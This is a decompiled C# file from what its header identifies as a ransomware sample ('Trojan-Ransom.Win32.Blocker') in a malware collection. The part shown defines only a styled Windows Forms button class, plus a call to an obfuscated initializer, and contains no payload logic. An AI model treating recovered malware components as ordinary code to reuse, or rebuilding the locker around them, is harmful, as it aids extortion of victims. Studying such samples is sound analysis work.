// Decompiled with JetBrains decompiler
// Type: FileLocker.AVButton
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class AVButton : Control
  {
    private static List<WeakReference> __ENCList;
    private Color Hover;
    private string _MainColor;
    private bool Loaded;

    [DebuggerNonUserCode]
    static AVButton()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AVButton.__ENCList = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (AVButton.__ENCList)
      {
        if (AVButton.__ENCList.Count == AVButton.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (AVButton.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (AVButton.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                AVButton.__ENCList[index1] = AVButton.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          AVButton.__ENCList.RemoveRange(index1, checked (AVButton.__ENCList.Count - index1));
          AVButton.__ENCList.Capacity = AVButton.__ENCList.Count;
        }
        AVButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    public AVButton()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      AVButton.__ENCAddToList((object) this);
      this.Size = new Size(33, 33);
      this.DoubleBuffered = true;
      this.SetStyle(ControlStyles.SupportsTransparentBackColor, true);
      this.BackColor = Color.Transparent;
    }

    [Description("Select color from the list")]
    [TypeConverter(typeof (btnColorProperty))]
    [Category("Misc")]
    public string MainColor
    {
      get => this._MainColor;
      set => this._MainColor = value;
    }

    protected override void OnMouseEnter(EventArgs e)
    {
      this.Hover = Color.FromArgb(228, 228, 228);
      this.Hover = Operators.CompareString(this._MainColor, "Light", false) != 0 ? Color.FromArgb(117, 117, 117) : Color.FromArgb(228, 228, 228);
      this.Invalidate();
      base.OnMouseEnter(e);
    }

    protected override void OnMouseLeave(EventArgs e)
    {
      this.Hover = Color.FromArgb(242, 242, 242);
      this.Hover = Operators.CompareString(this._MainColor, "Light", false) != 0 ? Color.DimGray : Color.FromArgb(242, 242, 242);
      this.Invalidate();
      base.OnMouseEnter(e);
    }

    protected override void OnMouseUp(MouseEventArgs e)
    {
      this.Hover = Operators.CompareString(this._MainColor, "Light", false) != 0 ? Color.FromArgb(117, 117, 117) : Color.FromArgb(228, 228, 228);
      this.Invalidate();
      base.OnMouseUp(e);
    }

    protected override void OnMouseDown(MouseEventArgs e)
    {
      this.Hover = Operators.CompareString(this._MainColor, "Light", false) != 0 ? Color.FromArgb(66, 66, 66) : Color.FromArgb(151, 151, 151);
      this.Invalidate();
      this.OnMouseClick(e);
    }

    public GraphicsPath RoundRect(Rectangle rectangle_0, int int_0)
    {
      GraphicsPath graphicsPath1 = new GraphicsPath();
      int num = checked (int_0 * 2);
      GraphicsPath graphicsPath2 = graphicsPath1;
      Rectangle rectangle = new Rectangle(rectangle_0.X, rectangle_0.Y, num, num);
      Rectangle rect1 = rectangle;
      graphicsPath2.AddArc(rect1, -180f, 90f);
      GraphicsPath graphicsPath3 = graphicsPath1;
      rectangle = new Rectangle(checked (rectangle_0.Width - num + rectangle_0.X), rectangle_0.Y, num, num);
      Rectangle rect2 = rectangle;
      graphicsPath3.AddArc(rect2, -90f, 90f);
      GraphicsPath graphicsPath4 = graphicsPath1;
      rectangle = new Rectangle(checked (rectangle_0.Width - num + rectangle_0.X), checked (rectangle_0.Height - num + rectangle_0.Y), num, num);
      Rectangle rect3 = rectangle;
      graphicsPath4.AddArc(rect3, 0.0f, 90f);
      GraphicsPath graphicsPath5 = graphicsPath1;
      rectangle = new Rectangle(rectangle_0.X, checked (rectangle_0.Height - num + rectangle_0.Y), num, num);
      Rectangle rect4 = rectangle;
      graphicsPath5.AddArc(rect4, 90f, 90f);
      graphicsPath1.AddLine(new Point(rectangle_0.X, checked (rectangle_0.Height - num + rectangle_0.Y)), new Point(rectangle_0.X, checked (int_0 + rectangle_0.Y)));
      return graphicsPath1;
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      base.OnPaint(e);
      Graphics graphics = e.Graphics;
      if (!this.Loaded)
      {
        this.Hover = Operators.CompareString(this.MainColor, "Light", false) != 0 ? Color.DimGray : Color.FromArgb(242, 242, 242);
        this.Loaded = true;
      }
      graphics.SmoothingMode = SmoothingMode.HighQuality;
      if (Operators.CompareString(this.MainColor, "Light", false) == 0)
        graphics.FillPath((Brush) new SolidBrush(Color.FromArgb(this.Hover.ToArgb())), this.RoundRect(new Rectangle(0, 0, checked (this.Width - 1), checked (this.Height - 1)), 5));
      else
        graphics.FillPath((Brush) new SolidBrush(Color.FromArgb(this.Hover.ToArgb())), this.RoundRect(new Rectangle(0, 0, checked (this.Width - 1), checked (this.Height - 1)), 5));
      graphics.DrawString(this.Text, new Font("Verdana", 10f), Brushes.Black, (float) ((double) this.Width / 2.0 - (double) graphics.MeasureString(this.Text, new Font("Verdana", 10f)).Width / 2.0), (float) ((double) this.Height / 2.0 - (double) graphics.MeasureString(this.Text, new Font("Verdana", 10f)).Height / 2.0));
      graphics.SmoothingMode = SmoothingMode.None;
    }
  }
}
